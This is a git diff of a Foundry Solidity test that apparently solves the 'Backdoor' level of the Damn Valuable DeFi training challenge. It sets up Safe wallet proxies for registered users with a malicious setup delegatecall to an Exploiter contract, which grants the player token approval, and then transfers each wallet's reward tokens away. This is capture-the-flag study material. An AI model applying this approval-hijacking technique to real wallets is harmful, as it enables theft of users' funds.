@@ -22,6 +22,7 @@ contract BackdoorChallenge is Test {
     ];
 
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
+    uint256 constant AMOUNT_TOKENS_REWARDED = 10e18;
 
     DamnValuableToken token;
     Safe singletonCopy;
@@ -85,34 +86,49 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        Attack attack = new Attack();
-        uint256 saltnonce = 42;
+        Exploiter exploiter = new Exploiter();
+
         for (uint256 i = 0; i < users.length; i++) {
-            address[] memory owners = new address[](1);
-            owners[0] = users[i];
-            bytes memory initializer = abi.encodeWithSignature(
-                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                owners,
-                1, // threshold
-                address(attack),
-                abi.encodeCall(Attack.run, (token, player)),
-                address(0),
-                address(0),
-                0,
-                payable(address(0))
+            bytes memory initializer = _buildInitializer(
+                users[i],
+                address(exploiter)
             );
-            console.log(msg.sender, address(this), player);
             address proxy = address(
                 walletFactory.createProxyWithCallback(
                     address(singletonCopy),
                     initializer,
-                    saltnonce,
+                    i, //saltnonce
                     walletRegistry
                 )
             );
 
-            token.transferFrom((proxy), recovery, 10e18);
+            token.transferFrom(proxy, recovery, AMOUNT_TOKENS_REWARDED);
         }
+    }
+
+    function _buildInitializer(
+        address owner,
+        address exploiter
+    ) internal view returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = owner;
+        return
+            abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1,
+                    address(exploiter),
+                    abi.encodeCall(
+                        Exploiter.exploit,
+                        (token, player, AMOUNT_TOKENS_REWARDED)
+                    ),
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
     }
 
     /**
@@ -137,12 +153,12 @@ contract BackdoorChallenge is Test {
     }
 }
 
-contract Attack {
-    // constructor(DamnValuableToken token, address recovery) {
-
-    // }
-    function run(DamnValuableToken token, address recovery) public {
-        console.log("2", msg.sender, address(this),recovery);
-        token.approve(recovery, 10e18);
+contract Exploiter {
+    function exploit(
+        DamnValuableToken token,
+        address spender,
+        uint256 reward
+    ) external {
+        token.approve(spender, reward);
     }
 }
